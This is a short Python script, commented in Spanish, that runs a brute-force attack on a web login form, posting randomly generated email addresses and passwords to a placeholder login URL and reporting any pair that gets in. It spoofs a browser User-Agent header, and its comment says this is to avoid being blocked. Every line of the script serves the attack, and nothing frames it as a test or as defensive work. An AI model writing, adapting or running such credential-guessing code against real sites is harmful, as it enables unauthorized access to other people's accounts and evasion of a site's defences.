import itertools
import requests
import string
import random

# Configura la URL del formulario
login_url = "https://tu-sitio.com/login"
success_indicator = "Bienvenido"  # Texto que indica que el inicio fue exitoso

# Generador de correos electrónicos dinámicos
def generate_emails(domain="gmail.com", count=10):
    for _ in range(count):
        nombre = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
        numero = random.randint(1, 9999)
        yield f"{nombre}{numero}@{domain}"

# Generador de contraseñas dinámicas
def generate_passwords(length=6, count=100):
    caracteres = string.ascii_letters + string.digits + string.punctuation  # Letras, números y símbolos
    for _ in range(count):
        yield ''.join(random.choices(caracteres, k=length))

# Configuración inicial
emails = generate_emails(count=5)  # Generar 5 correos
passwords = lambda: generate_passwords(length=8, count=100)  # Generar 100 contraseñas dinámicamente por correo

# Cabeceras opcionales para evitar ser bloqueado
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# Realiza intentos de inicio de sesión
for email in emails:
    print(f"Probando con email: {email}")
    
    for password in passwords():
        # Datos del formulario
        data = {
            "email": email,
            "password": password
        }
        
        # Realiza la solicitud POST al formulario
        response = requests.post(login_url, data=data, headers=headers)
        
        # Verifica si el inicio fue exitoso
        if success_indicator in response.text:
            print(f"[+] Acceso concedido con: {email}:{password}")
            break
        else:
            print(f"[-] Falló con: {email}:{password}")
    else:
        print(f"No se encontró ninguna contraseña válida para el email {email}.")
